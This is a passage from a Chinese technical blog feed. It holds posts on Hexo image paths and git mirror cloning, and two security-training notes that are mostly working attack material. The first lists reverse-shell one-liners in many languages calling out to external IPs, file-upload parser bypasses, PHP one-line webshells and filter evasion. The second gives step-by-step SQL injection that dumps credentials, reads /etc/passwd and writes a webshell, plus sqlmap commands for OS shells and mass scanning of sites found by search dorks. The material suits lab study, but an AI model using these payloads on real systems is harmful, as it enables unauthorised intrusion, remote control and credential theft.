<p>注意：<strong>重命名md文件之后记得重命名文件夹，当md文件的名称与文件夹名称不同时，映射关系以md文件名称为主。会导致src图片路径找不到</strong></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>检查<code>_config.yml</code>文件的<code>post_asset_folder:</code>选项是否为<code>true</code></li>
<li>检查创建文件之后的目录结构</li>
<li>检查<code>hexo-asset-image</code>插件的版本</li>
<li>检查路径引用图片的路径使用<code>/</code></li>
<li>检查md文件的文件名称和图片存放文件夹名称是否相同</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://blog.csdn.net/Sugar_Rainbow/article/details/57415705">Nuub - hexo生成博文插入图片</a></li>
<li><a href="https://blog.csdn.net/Strong997/article/details/97767929">99708 - hexo 本地图片不显示</a></li>
<li><a href="https://github.com/xcodebuild/hexo-asset-image">github - xcodebuild&#x2F;hexo-asset-image</a></li>
</ol>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>【git加速clone项目+切换远程https/ssh方式】</title>
    <url>/1092/</url>
    <content><![CDATA[<p>由于众所周知的原因github上clone项目极慢，时不时还一半就断开连接，这里提供使用国内镜像站的解决方法，完成之后修改remote路径以实现modify和push等操作。</p>
<p>还有一个问题，使用git提交文件push到github，每次都要输入用户名和密码，操作起来很麻烦，其原因是在clone 项目的时候，使用了默认的https方式，而不是ssh方式。</p>
<span id="more"></span>

<h1 id="加速clone"><a href="#加速clone" class="headerlink" title="加速clone"></a>加速clone</h1><p>目前已知Github国内镜像网站有<code>github.com.cnpmjs.org</code>和<code>git.sdut.me</code>。你可以根据你对这两个网站的访问速度快慢，选择其中一个即可。</p>
<p>接下来只需要在clone某个项目的时候将<code>github.com</code>替换为<code>github.com.cnpmjs.org</code>即可。如下例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/user/project</span><br></pre></td></tr></table></figure>

<p>替换为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com.cnpmjs.org/user/project</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://git.sdut.me/user/project</span><br></pre></td></tr></table></figure>

<p>之后修改仓库push url：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote -v <span class="comment">#查看当前远程url</span></span><br><span class="line"></span><br><span class="line">&gt;origin https://github.com.cnpmjs.org/user/project (fetch)</span><br><span class="line">&gt;origin https://github.com.cnpmjs.org/user/project (push)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改远程push url</span></span><br><span class="line">git remote set-url --push origin  https://github.com/user/project</span><br></pre></td></tr></table></figure>

<p>再次查看url已经变化，之后即可正常push。</p>
<h1 id="切换远程https-x2F-ssh方式"><a href="#切换远程https-x2F-ssh方式" class="headerlink" title="切换远程https&#x2F;ssh方式"></a>切换远程https&#x2F;ssh方式</h1><p>到本地项目文件夹子，打开git bash：</p>
<ol>
<li><p>查看clone地址：<code>git remote -v</code></p>
</li>
<li><p>移除https的方式，换成ssh方式：<code>git remote rm origin</code></p>
</li>
<li><p>添加新的git方式：<code>git remote add origin git@github.com:user/project</code></p>
</li>
<li><p>查看push方式是否修改成功：<code>git remote -v</code></p>
</li>
<li><p>重新push一下：<code>git push origin master</code></p>
</li>
</ol>
]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全4x01】洞明科技网络安全培训 --- day1</title>
    <url>/1093/</url>
    <content><![CDATA[<p>第一天讲文件上传里的一些绕过方法和反弹shell。</p>
<span id="more"></span>

<h1 id="Linux下NC反弹shell命令"><a href="#Linux下NC反弹shell命令" class="headerlink" title="Linux下NC反弹shell命令"></a>Linux下NC反弹shell命令</h1><p>本机开启监听：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br><span class="line"></span><br><span class="line">nc -vvlp 4444</span><br></pre></td></tr></table></figure>

<p>目标机器开启反弹</p>
<p>bash版本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>perl版本：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>php版本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ruby版本：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>python版本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>nc版本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br><span class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</span><br></pre></td></tr></table></figure>

<p>java版本：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<p>lua版本：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>

<p>NC版本不使用-e参数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mknod</span> /tmp/backpipe p</span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc x.x.x.x 4444 1&gt;/tmp/backpipe</span><br><span class="line"></span><br><span class="line">/bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="built_in">mknod</span> backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</span><br></pre></td></tr></table></figure>

<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3><ol>
<li><p>Apache解析漏洞成因</p>
<p>成因：<br>由于Apache 识别文件的规则是根据后缀名从右往左进行识别，遇到不在识别范围内就会自动忽略，往左进行识别，如果左边是在解析范围内的就会正常解析，而一般程序进行判断文件是否允许上传是根据最后的后缀名进行判断的。</p>
</li>
<li><p>Apache解析漏洞利用条件</p>
<p>Apache解析漏洞只存在于老版本中：<br>经测试：Apache 2.0 Apache 2.2 是存在解析漏洞的。</p>
</li>
<li><p>示例</p>
<p>在一个后端黑名单判断的文件上传的例子中：<br>如果Apache版本比较老，那么就可以使用如下的方式来绕过黑名单的检测。</p>
</li>
<li><p><code>.htaccess</code></p>
<p>（1）<code>.htaccess</code>（超文本访问）是许多Web服务器根据目录应用设置的有用文件，允许在运行时覆盖Apache服务器的默认配置。<br>（2）<code>.htaccess</code>是一个完整的文件名，不仅仅是文件的扩展名。</p>
<p><code>.htaccess</code>的代码如下：</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><ol>
<li><p>配置错误导致的解析漏洞</p>
<p>对于任意文件名，在后面加上&#x2F;任意文件名.php后该文件就会以php格式进行解析，是用户配置不当造成的。</p>
</li>
<li><p>00截断</p>
<p>Nginx解析漏洞<br>Nginx版本：0.5.， 0.6.， 0.7 &lt;&#x3D; 0.7.65， 0.8 &lt;&#x3D; 0.8.37<br>需要很老的版本才可以，00截断也和 php版本有关系。</p>
</li>
<li><p>CVE-2013-4547</p>
<p>Nginx 版本： 0.8.41～1.4.3， 1.5 &lt;&#x3D; 1.5.7<br>使用方法：<br>（1）上传文件名如： 1.jpg空格<br>（2）访问例如：1.jpg…php<br>（3）访问的时候抓包，修改后缀为<code>1.jpg[0x20][0x00][0x2e]php</code>（使用burp修改，调整 hex 即可）<br>（4）修改后进行访问就会发现 jpg 图片会被当做 php解析</p>
</li>
<li><p>使用<code>.user.ini</code>绕过黑名单</p>
<p>使用条件：<br>（1）服务器脚本语言为PHP 服务器使用CGI／FastCGI模式<br>（2）上传目录下要有可执行的php文件<br>例如：PHP study中使用 nginx 中间件的时候就可以进行实验。</p>
<p>使用方式：<br>（1）上传一张图片<br>（2）上传<code>.user.ini</code>文件。内容为：<code>auto_prepend_file=2.png</code>（这一句即可）<br>（3）访问：<code>http://IP/upload/2.png/xx.php</code>（目录中存在的 一个php文件）</p>
</li>
</ol>
<h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><ol>
<li><p>IIS 5.x-6.x</p>
<p>（1）目录解析<br><code>www.xxx.com/xx.asp/xx.jpg</code><br>（2）文件解析<br><code>www.xxx.com/xx.asp;.jpg</code></p>
</li>
<li><p>IIS 7.0-7.5</p>
<p><code>Upload/1.jpg/*.php</code></p>
<p>我们把下面的代码，插入到一张图片中。</p>
<p><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[x])?&gt;’)?&gt;</code></p>
<p>那么，访问<code>x.x.x/upload/1.jpg/.php</code>，就会在当前目录生成一个木马</p>
</li>
</ol>
<h2 id="php内容过滤"><a href="#php内容过滤" class="headerlink" title="php内容过滤"></a>php内容过滤</h2><ul>
<li><p>绕过<code>&lt;? ?&gt;</code>：使用<code>&lt;script language=php&gt; &lt;/script&gt;</code></p>
</li>
<li><p>绕过<code>eval</code>、<code>assert</code>过滤：使用<code>system();</code></p>
</li>
<li><p>绕过<code>GET</code>、<code>post</code>过滤：使用<code>REQUEST</code></p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script language=php&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$_REQUEST</span>[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>然后访问<code>url/xxx.php?cmd=</code>或者post一个<code>cmd=</code>的包均可，也可以写一个一句话木马到别的文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url/xxx.php?cmd=<span class="keyword">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[sb]);?&gt;&#x27;</span> &gt;&gt; test.php</span><br></pre></td></tr></table></figure>

<p>也可以直接反弹shell：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.234 4445 &gt;/tmp/f&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果同级路径下有后缀不为php的一句话木马，也可以一句话包含执行：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;<span class="keyword">include</span>(<span class="string">&#x27;ma.txt&#x27;</span>);&lt;/script&gt; </span><br></pre></td></tr></table></figure>

<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>upload-labs Less17</p>
<p>上传<code>123.php</code>，内容为生成下面的反弹shell，burp里intruder开500线程重复攻击，浏览器不断刷新访问还未被删除的<code>123.php</code>，直至反弹shell创建成功：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;gt.php&#x27;</span>, <span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全4x02】洞明科技网络安全培训 --- day2</title>
    <url>/1094/</url>
    <content><![CDATA[<p>第二天讲sql注入以及其中的一些绕过方法。</p>
<span id="more"></span>

<h1 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h1><h2 id="1-判断是否存在注入点"><a href="#1-判断是否存在注入点" class="headerlink" title="1. 判断是否存在注入点"></a>1. 判断是否存在注入点</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>  #恒真</span><br><span class="line">?id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>  #恒假</span><br></pre></td></tr></table></figure>

<h2 id="2-猜列数"><a href="#2-猜列数" class="headerlink" title="2. 猜列数"></a>2. 猜列数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">33</span> <span class="keyword">order</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>

<p>二分查找。</p>
<h2 id="3-union查询爆当前数据库名"><a href="#3-union查询爆当前数据库名" class="headerlink" title="3. union查询爆当前数据库名"></a>3. union查询爆当前数据库名</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="type">binary</span>(group_concat(<span class="keyword">user</span>(),database(),curtime())),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span></span><br></pre></td></tr></table></figure>

<p>这里加负号避免前面正常显示的数据占用了位置导致后面不显示。</p>
<h2 id="4-爆数据库列表"><a href="#4-爆数据库列表" class="headerlink" title="4. 爆数据库列表"></a>4. 爆数据库列表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="type">binary</span>(group_concat(schema_name)),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>

<p><code>group_concat</code>可以将查到的全部信息一行显示。</p>
<h2 id="5-爆tables列表"><a href="#5-爆tables列表" class="headerlink" title="5. 爆tables列表"></a>5. 爆tables列表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="type">binary</span>(group_concat(table_name)),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;cms&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="6-爆columns列表"><a href="#6-爆columns列表" class="headerlink" title="6. 爆columns列表"></a>6. 爆columns列表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="type">binary</span>(group_concat(column_name)),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;cms_users&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="7-爆相关column内容"><a href="#7-爆相关column内容" class="headerlink" title="7. 爆相关column内容"></a>7. 爆相关column内容</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="type">binary</span>(group_concat(userid,<span class="string">&#x27; &#x27;</span>,username,<span class="string">&#x27; &#x27;</span>,password)),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">from</span> cms_users</span><br></pre></td></tr></table></figure>

<h2 id="8-读取本地文件"><a href="#8-读取本地文件" class="headerlink" title="8. 读取本地文件"></a>8. 读取本地文件</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span></span><br></pre></td></tr></table></figure>

<h2 id="9-写入反弹shell"><a href="#9-写入反弹shell" class="headerlink" title="9. 写入反弹shell"></a>9. 写入反弹shell</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-33</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?php @eval($_POST[gt]);?&gt;&#x27;</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/gt.php&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h1><h2 id="1-GET-单个参数"><a href="#1-GET-单个参数" class="headerlink" title="1. [GET]单个参数"></a>1. [GET]单个参数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="2-GET-多个参数"><a href="#2-GET-多个参数" class="headerlink" title="2. [GET]多个参数"></a>2. [GET]多个参数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#指定参数</span><br><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1&amp;cc=1&quot;</span><br><span class="line"><span class="operator">-</span>p &quot;id&quot;</span><br></pre></td></tr></table></figure>

<h2 id="3-GET-多个URL"><a href="#3-GET-多个URL" class="headerlink" title="3. [GET]多个URL"></a>3. [GET]多个URL</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>m 文本文件</span><br><span class="line">选Y，对此URL注入测试；选n，自动进行下一个；选择q，退出探测。</span><br></pre></td></tr></table></figure>

<h2 id="4-POST-burp提取HTTP请求生成文件"><a href="#4-POST-burp提取HTTP请求生成文件" class="headerlink" title="4. [POST]burp提取HTTP请求生成文件"></a>4. [POST]burp提取HTTP请求生成文件</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>r E:\<span class="number">360</span>MoveData\Users\Administrator\Desktop\post.txt（第<span class="number">11</span>关）</span><br><span class="line">随意输入内容，使用burp抓包。</span><br></pre></td></tr></table></figure>

<h2 id="5-POST-使用–data传递post数据"><a href="#5-POST-使用–data传递post数据" class="headerlink" title="5. [POST]使用–data传递post数据"></a>5. [POST]使用–data传递post数据</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>r E:\<span class="number">360</span>MoveData\Users\Administrator\Desktop\post.txt（第<span class="number">11</span>关）</span><br><span class="line">随意输入内容，使用burp抓包。</span><br></pre></td></tr></table></figure>

<h1 id="COOKIE注入"><a href="#COOKIE注入" class="headerlink" title="COOKIE注入"></a>COOKIE注入</h1><h2 id="1-判断"><a href="#1-判断" class="headerlink" title="1. 判断"></a>1. 判断</h2><p>当我们登陆后将信息存在了COOKIE中，后台进行判断，发现COOKIE中会显示上面<br>的个人信息，而不是登录框。在上面的信息中可以看到，多出了一个Your ID：8，这<br>个信息很有可能是从数据库中查询出来的，我们再次访问该页面，使用burp抓包分析，<br>此时会发现获取到了COOKIE值。</p>
<p>可以看到COOKIE中有uname&#x3D;admin，说明后台很有可能利用COOKIE中的uname去数<br>据库中进行查询操作。</p>
<h2 id="2-手动检测"><a href="#2-手动检测" class="headerlink" title="2. 手动检测"></a>2. 手动检测</h2><p>将COOKIE中的信息改为uname&#x3D;admin’，页面报错了，并且从报错信息中可以看出，<br>后台使用的是单引号进行的拼凑。</p>
<h2 id="3-sqlmap注入"><a href="#3-sqlmap注入" class="headerlink" title="3. sqlmap注入"></a>3. sqlmap注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.30</span><span class="number">.88</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-20</span><span class="operator">/</span> <span class="comment">--cookie</span></span><br><span class="line">&quot;uname=admin&quot; <span class="comment">--level=2</span></span><br></pre></td></tr></table></figure>

<h1 id="sqlmap经典语法"><a href="#sqlmap经典语法" class="headerlink" title="sqlmap经典语法"></a>sqlmap经典语法</h1><h2 id="1-–banner"><a href="#1-–banner" class="headerlink" title="1. –banner"></a>1. –banner</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查询数据库类型，版本信息。（任意一个url都可以）</span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="comment">--banner</span></span><br></pre></td></tr></table></figure>

<h2 id="2-g-“谷歌语法”"><a href="#2-g-“谷歌语法”" class="headerlink" title="2. -g “谷歌语法”"></a>2. -g “谷歌语法”</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">对网站url进行批量注入测试</span><br><span class="line">如inurl:index.php?id<span class="operator">=</span> 在没有google搜索引擎的情况下，使用baidu也是不错的。</span><br><span class="line">会搜索到很多网站，可以对这些网站进行尝试。不过这些都是属于未授权测试，只做演示。</span><br><span class="line">sqlmap.py <span class="operator">-</span>g &quot;inurl:index.php?id=&quot;</span><br></pre></td></tr></table></figure>

<h2 id="3-–sql-shell"><a href="#3-–sql-shell" class="headerlink" title="3. –sql-shell"></a>3. –sql-shell</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--sqlshell</span></span><br><span class="line">执行操作指令，之后执行<span class="keyword">sql</span>语句即可。</span><br></pre></td></tr></table></figure>

<h2 id="4-–os-shell"><a href="#4-–os-shell" class="headerlink" title="4. –os-shell"></a>4. –os-shell</h2><p>执行条件：<br>    1. 网站必须是root权限<br>    2. 攻击者需要知道网站的绝对路径<br>    3. GPC为off，php主动转义的功能关闭</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>

<h2 id="5-–os-cmd"><a href="#5-–os-cmd" class="headerlink" title="5. –os-cmd"></a>5. –os-cmd</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="comment">--os-cmd=whoami 成功执行</span></span><br></pre></td></tr></table></figure>

<h2 id="6-–file-read"><a href="#6-–file-read" class="headerlink" title="6. –file-read"></a>6. –file-read</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="comment">--file-read=&quot;c://test.php&quot;</span></span><br></pre></td></tr></table></figure>

